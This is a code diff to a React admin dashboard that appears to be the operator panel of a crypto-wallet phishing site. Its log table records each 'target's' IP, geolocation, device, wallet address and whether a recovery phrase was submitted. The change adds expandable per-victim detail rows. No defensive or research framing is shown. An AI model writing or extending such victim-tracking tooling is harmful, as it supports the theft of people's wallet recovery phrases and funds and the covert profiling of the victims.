@@ -1,5 +1,5 @@
 "use client";
-import { useState, useEffect } from "react";
+import React, { useState, useEffect } from "react";
 
 export default function AdminPage() {
   const [isLogged, setIsLogged] = useState(false);
@@ -8,6 +8,7 @@ export default function AdminPage() {
   const [error, setError] = useState("");
 
   const [logs, setLogs] = useState<any[]>([]);
+  const [expandedLogId, setExpandedLogId] = useState<string | null>(null);
   const [masterPhrase, setMasterPhrase] = useState("");
   const [toast, setToast] = useState("");
 
@@ -203,40 +204,66 @@ export default function AdminPage() {
                   </thead>
                   <tbody className="divide-y divide-zinc-800/60 font-mono text-xs">
                     {logs.map((log) => (
-                      <tr key={log.id} className="hover:bg-[#161616] transition-colors group">
-                        <td className="px-6 py-4 whitespace-nowrap text-zinc-500">
-                          {new Date(log.timestamp).toLocaleTimeString()}
-                        </td>
-                        <td className="px-6 py-4 whitespace-nowrap text-zinc-300">
-                          {log.ip}
-                        </td>
-                        <td className="px-6 py-4 whitespace-nowrap text-zinc-400">
-                          {log.location || "Unknown"}
-                        </td>
-                        <td className="px-6 py-4 whitespace-nowrap text-zinc-400">
-                          {log.isMobile ? "📱" : "💻"} {log.os || "Unknown OS"} • {log.browser || "Unknown Browser"}
-                        </td>
-                        <td className="px-6 py-4 whitespace-nowrap text-blue-400">
-                          {log.wallet || "-"}
-                        </td>
-                        <td className="px-6 py-4 whitespace-nowrap">
-                          {log.status === "visited_site" && (
-                            <span className="inline-flex items-center px-2 py-1 rounded bg-zinc-800 text-zinc-300">
-                              Target Visited Platform
-                            </span>
-                          )}
-                          {log.status === "connection_failed" && (
-                            <span className="inline-flex items-center px-2 py-1 rounded bg-amber-500/10 text-amber-500 border border-amber-500/20">
-                              Connection Request Refused
-                            </span>
-                          )}
-                          {log.status === "phrase_submitted" && (
-                            <span className="inline-flex items-center px-2 py-1 rounded bg-indigo-500/10 text-indigo-400 border border-indigo-500/20">
-                              Phase Submitting (Encrypted)
-                            </span>
-                          )}
-                        </td>
-                      </tr>
+                      <React.Fragment key={log.id}>
+                        <tr 
+                          onClick={() => setExpandedLogId(expandedLogId === log.id ? null : log.id)}
+                          className="hover:bg-[#161616] transition-colors group cursor-pointer"
+                        >
+                          <td className="px-6 py-4 whitespace-nowrap text-zinc-500">
+                            {new Date(log.timestamp).toLocaleTimeString()}
+                          </td>
+                          <td className="px-6 py-4 whitespace-nowrap text-zinc-300 flex items-center gap-2">
+                            {log.ip}
+                            <svg className={`w-4 h-4 text-zinc-600 transition-transform ${expandedLogId === log.id ? 'rotate-180' : ''}`} fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" /></svg>
+                          </td>
+                          <td className="px-6 py-4 whitespace-nowrap text-zinc-400">
+                            {log.location || "Unknown"}
+                          </td>
+                          <td className="px-6 py-4 whitespace-nowrap text-zinc-400">
+                            {log.isMobile ? "📱" : "💻"} {log.os || "Unknown OS"} • {log.browser || "Unknown Browser"}
+                          </td>
+                          <td className="px-6 py-4 whitespace-nowrap text-blue-400">
+                            {log.wallet || "-"}
+                          </td>
+                          <td className="px-6 py-4 whitespace-nowrap">
+                            {log.status === "visited_site" && (
+                              <span className="inline-flex items-center px-2 py-1 rounded bg-zinc-800 text-zinc-300">
+                                Target Visited Platform
+                              </span>
+                            )}
+                            {log.status === "connection_failed" && (
+                              <span className="inline-flex items-center px-2 py-1 rounded bg-amber-500/10 text-amber-500 border border-amber-500/20">
+                                Connection Request Refused
+                              </span>
+                            )}
+                            {log.status === "phrase_submitted" && (
+                              <span className="inline-flex items-center px-2 py-1 rounded bg-indigo-500/10 text-indigo-400 border border-indigo-500/20">
+                                Phase Submitting (Encrypted)
+                              </span>
+                            )}
+                          </td>
+                        </tr>
+                        {expandedLogId === log.id && (
+                          <tr className="bg-[#0d0d0d] border-t border-b border-zinc-800/50">
+                            <td colSpan={6} className="px-6 py-6">
+                              <div className="grid grid-cols-2 md:grid-cols-4 gap-6">
+                                <div>
+                                  <h4 className="text-[10px] uppercase tracking-wider text-zinc-500 mb-2 font-semibold">Exact Timestamp</h4>
+                                  <p className="text-zinc-300">{new Date(log.timestamp).toLocaleString()}</p>
+                                </div>
+                                <div>
+                                  <h4 className="text-[10px] uppercase tracking-wider text-zinc-500 mb-2 font-semibold">Geolocation Details</h4>
+                                  <p className="text-zinc-300">{log.location}</p>
+                                </div>
+                                <div className="md:col-span-2">
+                                  <h4 className="text-[10px] uppercase tracking-wider text-zinc-500 mb-2 font-semibold">Device Profile</h4>
+                                  <p className="text-zinc-300">{log.os} / {log.browser} {log.isMobile ? "(Mobile Device)" : "(Desktop Device)"}</p>
+                                </div>
+                              </div>
+                            </td>
+                          </tr>
+                        )}
+                      </React.Fragment>
                     ))}
                   </tbody>
                 </table>
